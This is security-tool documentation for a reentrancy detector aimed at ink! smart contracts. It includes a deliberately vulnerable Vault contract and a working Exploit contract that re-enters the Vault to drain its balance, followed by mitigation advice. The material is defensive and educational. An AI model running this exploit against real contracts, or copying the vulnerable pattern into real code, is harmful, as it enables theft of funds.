# Reentrancy

## Configuration

- Detector ID: `reentrancy`
- Analysis Category: `Reentrancy`
- Severity: `High`

## Description

Smart contracts can call other contracts and send tokens to them. These operations imply external calls where control flow is passed to the called contract until the execution of the called code is over. Then the control is delivered back to the caller.

External calls, therefore, could open the opportunity for a malicious contract to execute any arbitrary code. This includes calling back the caller contract, an attack known as reentrancy. This kind of attack was used in Ethereum for the infamous [DAO Hack](https://blog.chain.link/reentrancy-attacks-and-the-dao-hack/).

## Exploit Scenario

In order to perform this exploit we work through an example consisting of two contracts: a `Vault` contract and an `Exploit` contract.

The `Vault` contract provides functions to deposit, withdraw, check balance, and call a function on another contract with a specified value.

```rust
#![cfg_attr(not(feature = "std"), no_std)]

#[ink::contract]
mod vault {
    use ink::{storage::Mapping, env::call::{build_call, Selector} };
    #[ink(storage)]
    pub struct Vault {
        balances: Mapping<AccountId, Balance>
    }

    impl Vault {

        #[ink(constructor)]
        pub fn new() -> Self {
            Self {
                balances: Mapping::default()
            }
        }

        #[ink(message, payable)]
        pub fn deposit(&mut self) -> Balance {
            let caller_addr = self.env().caller();
            let caller_balance = self.balances.get(caller_addr).unwrap_or(0);
            let updated_balance = caller_balance + self.env().transferred_value();
            self.balances.insert(caller_addr, &updated_balance);
            return updated_balance;
        }

        #[ink(message)]
        pub fn balance(&mut self, account: AccountId) -> Balance {
            self.balances.get(account).unwrap_or(0)
        }

        #[ink(message)]
        pub fn withdraw(&mut self, amount: Balance) -> Balance {
            let caller_addr = self.env().caller();
            let caller_balance = self.balances.get(caller_addr).unwrap_or(0);
            if amount <= caller_balance {
                let updated_balance = caller_balance - amount;
                if self.env().transfer(self.env().caller(), amount).is_err() {
                    panic!(
                        "requested transfer failed."
                    )
                }
                self.balances.insert(caller_addr, &updated_balance);
                return updated_balance;
            } else {
                panic!("amount > balance")
            }
        }

        #[ink(message)]
        pub fn call_with_value(&mut self, address: AccountId, amount: Balance, selector: u32) -> Balance {
            ink::env::debug_println!("call_with_value function called from {:?}",self.env().caller());
            let caller_addr = self.env().caller();
            let caller_balance = self.balances.get(caller_addr).unwrap_or(0);
            if amount <= caller_balance {
                let call = build_call::<ink::env::DefaultEnvironment>()
                    .call(address)
                    .transferred_value(amount)
                    .exec_input(
                        ink::env::call::ExecutionInput::new(Selector::new(selector.to_be_bytes()))
                    )
                    .call_flags(
                        ink::env::CallFlags::default()
                            .set_allow_reentry(true)
                    )
                    .returns::<()>()
                    .params();
                self.env().invoke_contract(&call)
                    .unwrap_or_else(|err| panic!("Err {:?}",err))
                    .unwrap_or_else(|err| panic!("LangErr {:?}",err));
                self.balances.insert(caller_addr, &(caller_balance - amount));

                return caller_balance - amount;
            } else {
                return caller_balance
            }
        }
    }

}
```

Let's take a closer look at the `call_with_value function()`. Thi is an ink! message that allows the contract owner to call other contracts on the blockchain and transfer a specified amount of value in the process. The function takes three arguments:

    address: The address of the contract to call.
    amount: The amount of balance to transfer in the call.
    selector: The 32-bit function selector of the function to call on the contract.

The function first checks the balance of the caller to make sure that they have enough funds to perform the transfer. If the balance is sufficient, a new call is constructed using the build_call function provided by the env::call module.

The `build_call()` function constructs a new contract call with the specified arguments. In this case, the call method is used to specify the address of the contract to call, the transferred_value method is used to specify the amount of balance to transfer, and the exec_input method is used to specify the function selector and any arguments to pass to the called function.

The `call_flags()` method is also used to set a flag that allows the called contract to re-enter the current contract if necessary. This possibility ti re-enter the contract, together with an appropiate 32-bit function selector will allow us to repeatedly withdraw balance from the contract, emptying the Vault.

In order to perform this attack, we will use the `exploit()` function of the `Exploit` contract that we outline below:

```rust
#![cfg_attr(not(feature = "std"), no_std)]

#[ink::contract]
mod exploit {
    use ink::env::call::{build_call, Selector};

    #[ink(storage)]
    pub struct Exploit {
        owner: AccountId,
        contract: AccountId,
        amount: Balance,
        gas_to_stop: u64
    }

    impl Exploit {
        #[ink(constructor)]
        pub fn new(owner: AccountId, contract: AccountId, amount: Balance, gas_to_stop: u64) -> Self {
            Self {
                owner: owner,
                contract: contract,
                amount: amount,
                gas_to_stop: gas_to_stop
            }
        }

        #[ink(message)]
        pub fn set_gas_to_stop(&mut self, gas_to_stop: u64) {
            self.gas_to_stop = gas_to_stop;
        }

        #[ink(message)]
        pub fn get_balance(&mut self) -> Balance {
            self.env().balance()
        }

        #[ink(message, payable)]
        pub fn deposit(&mut self) -> Balance {
            let call = build_call::<ink::env::DefaultEnvironment>()
                .call(self.contract)
                .transferred_value(self.env().transferred_value())
                .exec_input(
                    ink::env::call::ExecutionInput::new(
                        Selector::new([0x2D_u8,0x10_u8,0xC9_u8,0xBD_u8])
                    ).into()
                ).returns::<Balance>().params();
            self.env().invoke_contract(&call)
                .unwrap_or_else(|err| panic!("Err {:?}",err))
                .unwrap_or_else(|err| panic!("LangErr {:?}",err))
        }

        #[ink(message, payable, selector = 0x0)]
        pub fn exploit(&mut self) {
            ink::env::debug_println!("Exploit  function called from {:?} gas left {:?}",self.env().caller(), self.env().gas_left());
            if self.env().gas_left() > self.gas_to_stop{
                let call = build_call::<ink::env::DefaultEnvironment>()
                .call(self.contract)
                .transferred_value(0)
                .exec_input(
                    ink::env::call::ExecutionInput::new(Selector::new([0x76_u8,0x75_u8,0x7E_u8,0xD3_u8]))
                        .push_arg(self.env().account_id())
                        .push_arg(self.amount)
                        .push_arg(0)
                )
                .call_flags(
                    ink::env::CallFlags::default()
                        .set_allow_reentry(true)
                )
                .returns::<Balance>()
                .params();
                ink::env::debug_println!("Call generated gas left:{:?}",self.env().gas_left());
                self.env().invoke_contract(&call)
                    .unwrap_or_else(|err| panic!("Err {:?}",err))
                    .unwrap_or_else(|err| panic!("LangErr {:?}",err));
                ink::env::debug_println!("Call finished");
            }
        }
    }

}

```

### Deployment

Vault and Exploit files can be found under the directories ./example/exploit and ./example/vault. The whole exploit example can be run automatically using the `deploy.sh` file.

### Tutorial

See this [tutorial](https://drive.google.com/file/d/1ekyXG7Mc9FLk916eHFc2W7xXlfZbpA0_/view?usp=share_link) (in Spanish) showing this exploit in action.

In this preliminary [tutorialV1](https://drive.google.com/file/d/1xdd3sECx0_qwVmwTpqs2zHNdKjghAae3/view?usp=share_link) (in Spanish) we explain a bit more in depth the different functions.

## Recommendation

Reentrancy can be addressed with the Check-Effect-Interaction pattern, a best practice that indicates that external calls should be the last thing to be executed in a function.

In our example, this means to set the balance of the message sender before transfering them the tokens. Another approach is to use a [reentrancy guard](https://github.com/Supercolony-net/openbrush-contracts/tree/main/contracts/src/security/reentrancy_guard) like the one offered by [OpenBrush](https://github.com/Supercolony-net/openbrush-contracts).

## References

- https://use.ink/datastructures/storage-layout
- https://consensys.github.io/smart-contract-best-practices/attacks/reentrancy/
- https://dasp.co/#item-1
- https://blog.sigmaprime.io/solidity-security.html#SP-1
- https://docs.soliditylang.org/en/develop/security-considerations.html#re-entrancy
- [Ethernaut: Reentrancy](https://ethernaut.openzeppelin.com/level/0xe6BA07257a9321e755184FB2F995e0600E78c16D)
- [SWC-107](https://swcregistry.io/docs/SWC-107)
- [Slither: Reentrancy vulnerabilities (theft of ethers)](https://github.com/crytic/slither/wiki/Detector-Documentation#reentrancy-vulnerabilities)
- [Slither: Reentrancy vulnerabilities (no theft of ethers)](https://github.com/crytic/slither/wiki/Detector-Documentation#reentrancy-vulnerabilities-1)
- [Slither: Benign reentrancy vulnerabilities](https://github.com/crytic/slither/wiki/Detector-Documentation#reentrancy-vulnerabilities-2)
- [Slither: Reentrancy vulnerabilities leading to out-of-order Events](https://github.com/crytic/slither/wiki/Detector-Documentation#reentrancy-vulnerabilities-3)
- [Slither: Reentrancy vulnerabilities through send and transfer](https://github.com/crytic/slither/wiki/Detector-Documentation#reentrancy-vulnerabilities-4)
